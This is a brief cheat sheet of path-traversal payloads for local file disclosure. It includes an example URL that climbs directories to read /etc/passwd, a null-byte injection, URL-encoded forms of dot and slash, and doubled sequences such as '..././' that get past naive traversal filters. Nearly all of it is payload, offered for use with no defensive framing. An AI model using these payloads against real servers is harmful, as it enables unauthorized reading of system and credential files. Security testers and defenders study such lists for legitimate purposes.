Local file disclosure
Example
http://test.com/image=../../../etc/passwd
Null byte injection, url encoding
```%00``` or ```?```
```.``` = ```%2e```
```/``` = ```%2f```
```../``` = ```%2e%2e%2f```
```..././``` = ```../```
```..../``` = ```../```